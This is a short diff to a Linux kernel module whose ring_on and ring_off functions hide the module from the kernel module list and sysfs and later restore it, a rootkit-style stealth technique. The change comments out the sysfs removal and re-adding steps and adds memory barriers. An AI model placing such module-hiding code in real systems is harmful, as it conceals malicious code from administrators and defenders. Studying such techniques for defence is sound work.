@@ -87,24 +87,30 @@ void ring_on(void)
     _kobj = &__this_module.mkobj.kobj;              /* Remember kobject */
     _kgrp = &(__this_module.sect_attrs->grp);       /* Remember sysfs group */
     _kobj_parent = __this_module.mkobj.kobj.parent; /* Remember kobject parent */
-    kobject_del(&__this_module.mkobj.kobj);         /* Remove from sysfs */
+//    kobject_del(&__this_module.mkobj.kobj);         /* Remove from sysfs */
 
     printk("The ring of power is applied.\n");
 }
 
 void ring_off(void)
 {
+    barrier();
     /* Add the LKM back into the system module list */
     list_add(&__this_module.list, _module_list);
+    barrier();
+/*
     if (kobject_add(_kobj, _kobj_parent, "eye") == -EINVAL)
     {
         kobject_put(_kobj);
         return;
     }
+*/
 
     /* Add the LKM back into the sysfs group */
+/*
     sysfs_update_group(_kobj, _kgrp);
     kobject_uevent(_kobj, KOBJ_ADD);
+*/
 
     printk("The ring of power is removed.\n");
 }
